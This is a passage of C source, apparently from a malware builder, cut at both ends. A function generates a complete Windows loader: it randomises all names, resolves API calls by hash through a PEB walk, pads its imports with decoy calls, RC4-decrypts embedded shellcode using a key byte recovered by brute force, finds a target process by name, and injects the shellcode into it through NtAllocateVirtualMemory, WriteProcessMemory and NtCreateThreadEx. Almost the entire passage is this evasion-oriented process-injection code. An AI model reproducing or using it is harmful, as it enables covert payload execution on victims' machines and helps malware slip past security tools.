        NtDelayExecution_typedef,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        writeprocessmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        createtoolhelp32snapshot_hash_name,
        process32first_hash_name,
        process32next_hash_name,
        openprocess_hash_name,
        lstrcmpiA_hash_name,
        random_obf_func,
        xkey,
        obfuscated_fun,
            Remotprocess,



        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name,
        WriteProcessMemory_typedef, pWriteProcessMemory_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name,
        NtClose_typedef, pNtClose_name,
        CreateToolhelp32Snapshot_typedef, pCreateToolhelp32Snapshot_name,
        Process32First_typedef, pProcess32First_name,
        Process32Next_typedef, pProcess32Next_name,
        OpenProcess_typedef, pOpenProcess_name,
        lstrcmpiA_typedef, plstrcmpiA_name,
        random_toUpper_name,
        random_mymalloc_func,
        random_hashstring_func,
        random_hashstring_func,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_rc4guard_func,
        random_mymalloc_func,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray,
        hint,
        random_payload_name,
        random_findtarget_func,
        pCreateToolhelp32Snapshot_name,
        pProcess32First_name,
        pNtClose_name,
        pProcess32Next_name,
        plstrcmpiA_name,
        pNtClose_name,
        random_inject_func,
        pNtAllocateVirtualMemory_name,
        pWriteProcessMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_initialize_func,
        random_getmodule_name, ntdll_hash_name,
        random_getmodule_name, kernel32_hash_name,
        pCreateToolhelp32Snapshot_name, CreateToolhelp32Snapshot_typedef, random_getproc_name, createtoolhelp32snapshot_hash_name,
        pProcess32First_name, Process32First_typedef, random_getproc_name, process32first_hash_name,
        pProcess32Next_name, Process32Next_typedef, random_getproc_name, process32next_hash_name,
        pOpenProcess_name, OpenProcess_typedef, random_getproc_name, openprocess_hash_name,
        plstrcmpiA_name, lstrcmpiA_typedef, random_getproc_name, lstrcmpiA_hash_name,
        pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        pWriteProcessMemory_name, WriteProcessMemory_typedef, random_getproc_name, writeprocessmemory_hash_name,
        pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_start_func,
        random_initialize_func,

        random_obf_func,

        random_findtarget_func,
        pOpenProcess_name,
        random_rc4guard_func, random_key_name, random_payload_name, random_key_name, random_payload_name,
        random_inject_func, random_payload_name,
        pNtClose_name,
        random_run_func,
        random_start_func,
        random_run_func

    );
}
void obf_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pWriteProcessMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pCreateToolhelp32Snapshot_name[9], pProcess32First_name[9], pProcess32Next_name[9];
    char pOpenProcess_name[9], plstrcmpiA_name[9], pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pWriteProcessMemory_name, sizeof(pWriteProcessMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pCreateToolhelp32Snapshot_name, sizeof(pCreateToolhelp32Snapshot_name));
    generate_random_string(pProcess32First_name, sizeof(pProcess32First_name));
    generate_random_string(pProcess32Next_name, sizeof(pProcess32Next_name));
    generate_random_string(pOpenProcess_name, sizeof(pOpenProcess_name));
    generate_random_string(plstrcmpiA_name, sizeof(plstrcmpiA_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char writeprocessmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11], createtoolhelp32snapshot_hash_name[11];
    char process32first_hash_name[11], process32next_hash_name[11], openprocess_hash_name[11];
    char lstrcmpiA_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(writeprocessmemory_hash_name, sizeof(writeprocessmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));
    generate_random_string(createtoolhelp32snapshot_hash_name, sizeof(createtoolhelp32snapshot_hash_name));
    generate_random_string(process32first_hash_name, sizeof(process32first_hash_name));
    generate_random_string(process32next_hash_name, sizeof(process32next_hash_name));
    generate_random_string(openprocess_hash_name, sizeof(openprocess_hash_name));
    generate_random_string(lstrcmpiA_hash_name, sizeof(lstrcmpiA_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], WriteProcessMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char CreateToolhelp32Snapshot_typedef[12], Process32First_typedef[12], Process32Next_typedef[12];
    char OpenProcess_typedef[12], lstrcmpiA_typedef[12], NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(WriteProcessMemory_typedef, sizeof(WriteProcessMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(CreateToolhelp32Snapshot_typedef, sizeof(CreateToolhelp32Snapshot_typedef));
    generate_random_string(Process32First_typedef, sizeof(Process32First_typedef));
    generate_random_string(Process32Next_typedef, sizeof(Process32Next_typedef));
    generate_random_string(OpenProcess_typedef, sizeof(OpenProcess_typedef));
    generate_random_string(lstrcmpiA_typedef, sizeof(lstrcmpiA_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Random names for additional functions
    char random_rc4guard_func[10], random_findtarget_func[10];
    char random_initialize_func[10], random_start_func[10], random_run_func[10];
    char random_hacked_func[10], random_dllmain_func[10];
    char random_hashstring_func[10], random_memcpy_func[10], random_mymalloc_func[10];

    generate_random_string(random_rc4guard_func, sizeof(random_rc4guard_func));
    generate_random_string(random_findtarget_func, sizeof(random_findtarget_func));
    generate_random_string(random_initialize_func, sizeof(random_initialize_func));
    generate_random_string(random_start_func, sizeof(random_start_func));
    generate_random_string(random_run_func, sizeof(random_run_func));
    generate_random_string(random_hacked_func, sizeof(random_hacked_func));
    generate_random_string(random_dllmain_func, sizeof(random_dllmain_func));
    generate_random_string(random_hashstring_func, sizeof(random_hashstring_func));
    generate_random_string(random_memcpy_func, sizeof(random_memcpy_func));
    generate_random_string(random_mymalloc_func, sizeof(random_mymalloc_func));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess, xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* %s)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "#define %s                      0x5251037A\n"
        "#define %s                   0xA5E086A2\n"
        "#define %s    0x0B37D3B9\n"
        "#define %s    0x54256ED5\n"
        "#define %s    0xCB42C5A9\n"
        "#define %s    0x61D8C71D\n"
        "#define %s    0x1236E2D7\n"
        "#define %s    0xF20D7F2A\n"
        "#define %s    0xA4E3F108\n"
        "#define %s    0xB9D893EC\n"
        "#define %s    0x5D3C1742\n"
        "#define %s    0xA00889BE\n"
        "#define %s    0x35DB6F55\n"
        "#define %s    0x2007BE63\n"
        "#define %s    0xC9B81F21\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char aze[] = {%s};\n"
        "char rpf[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "int %s(void) {\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress) return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n"
        "CHAR %s(CHAR C) {\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* %s(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0;\n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD %s(_In_ LPCSTR String) {\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (%s((PCHAR) API))\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0) return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;\n"
        "    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0) return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL %s(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE b = 0;\n"
        "    INT i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)%s(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey) return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte) break;\n"
        "        else b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char poi[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)aze, sizeof(aze), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(poi), aze);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T len = sizeof(%s);\n"
        "int %s(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = p%s(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!p%s(hProcSnap, &pe32)) {\n"
        "        p%s(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (p%s(hProcSnap, &pe32)) {\n"
        "        if (p%s(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    p%s(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int %s(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID address = NULL;\n"
        "    HANDLE hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    p%s(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    p%s(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE sdfg = %s(%s);\n"
        "    HMODULE vgbh = %s(%s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        "    int pid = 0;\n"
        "    %s((char*)rpf, sizeof(rpf), xkey, sizeof(xkey)); \n"
        "    pid = %s(rpf);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = p%s(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            %s(HINT_BYTE, %s, %s, sizeof(%s), sizeof(%s));\n"
        "            %s(hProc, %s, len);\n"
        "            p%s(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        CreateToolhelp32Snapshot_typedef,
        Process32First_typedef,
        Process32Next_typedef,
        OpenProcess_typedef,
        lstrcmpiA_typedef,
        NtAllocateVirtualMemory_typedef,
        WriteProcessMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        GetProcAddress_typedef,
        NtDelayExecution_typedef,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        writeprocessmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        createtoolhelp32snapshot_hash_name,
        process32first_hash_name,
        process32next_hash_name,
        openprocess_hash_name,
        lstrcmpiA_hash_name,
        random_obf_func,
        xkey,
        obfuscated_fun,
        Remotprocess,

        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name,
        WriteProcessMemory_typedef, pWriteProcessMemory_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name,
        NtClose_typedef, pNtClose_name,
        CreateToolhelp32Snapshot_typedef, pCreateToolhelp32Snapshot_name,
        Process32First_typedef, pProcess32First_name,
        Process32Next_typedef, pProcess32Next_name,
        OpenProcess_typedef, pOpenProcess_name,
        lstrcmpiA_typedef, plstrcmpiA_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        random_toUpper_name,
        random_mymalloc_func,
        random_hashstring_func,
        random_hashstring_func,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_rc4guard_func,
        random_mymalloc_func,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray,
        hint,
        random_payload_name,
        random_findtarget_func,
        pCreateToolhelp32Snapshot_name,
        pProcess32First_name,
        pNtClose_name,
        pProcess32Next_name,
        plstrcmpiA_name,
        pNtClose_name,
        random_inject_func,
        pNtAllocateVirtualMemory_name,
        pWriteProcessMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_initialize_func,
        random_getmodule_name, ntdll_hash_name,
        random_getmodule_name, kernel32_hash_name,
        pCreateToolhelp32Snapshot_name, CreateToolhelp32Snapshot_typedef, random_getproc_name, createtoolhelp32snapshot_hash_name,
        pProcess32First_name, Process32First_typedef, random_getproc_name, process32first_hash_name,
        pProcess32Next_name, Process32Next_typedef, random_getproc_name, process32next_hash_name,
        pOpenProcess_name, OpenProcess_typedef, random_getproc_name, openprocess_hash_name,
        plstrcmpiA_name, lstrcmpiA_typedef, random_getproc_name, lstrcmpiA_hash_name,
        pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        pWriteProcessMemory_name, WriteProcessMemory_typedef, random_getproc_name, writeprocessmemory_hash_name,
        pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
